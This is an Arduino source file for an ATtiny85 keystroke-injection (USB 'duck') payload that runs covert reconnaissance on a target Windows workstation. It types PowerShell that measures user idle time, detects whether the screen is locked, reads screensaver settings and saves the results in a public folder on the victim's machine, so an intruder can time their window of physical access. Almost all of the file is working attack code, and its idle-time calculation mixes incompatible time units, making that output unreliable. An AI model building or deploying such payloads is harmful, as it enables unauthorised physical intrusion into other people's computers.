// recon/idle-lock - Tier 2
//
// Was the workstation idle, and is it locked? Times your window.
//
// (no notes)
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "Add-Type -Name L -Namespace Q -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO l); [StructLayout(LayoutKind.Sequential)] public struct LASTINPUTINFO{public uint cbSize;public uint dwTime;}'"
    "$l=New-Object Q.L+LASTINPUTINFO;$l.cbSize=[Runtime.InteropServices.Marshal]::SizeOf($l)"
    "[void][Q.L]::GetLastInputInfo([ref]$l)"
    "$idle=[int]((Get-Date).Ticks - $l.dwTime)/10000"
    "[pscustomobject]@{IdleMilliseconds=$idle;IdleMinutes=[math]::Round($idle/60000,1);Locked=(Get-Process LogonUI -EA 0) -ne $null;ScreenSaverActive=[bool](Get-ItemProperty 'HKCU:\\Control Panel\\Desktop' -EA 0).ScreenSaveActive}|Format-List"
    "'=== CONSUMER SCREENSAVER TIMEOUT ==='"
    "(Get-ItemProperty 'HKCU:\\Control Panel\\Desktop' -EA 0)|Select ScreenSaveTimeOut,ScreenSaverIsSecure,ScreenSaveActive|Format-List"
    R_OUT("idle-lock.txt")
    R_SHOW("idle-lock.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
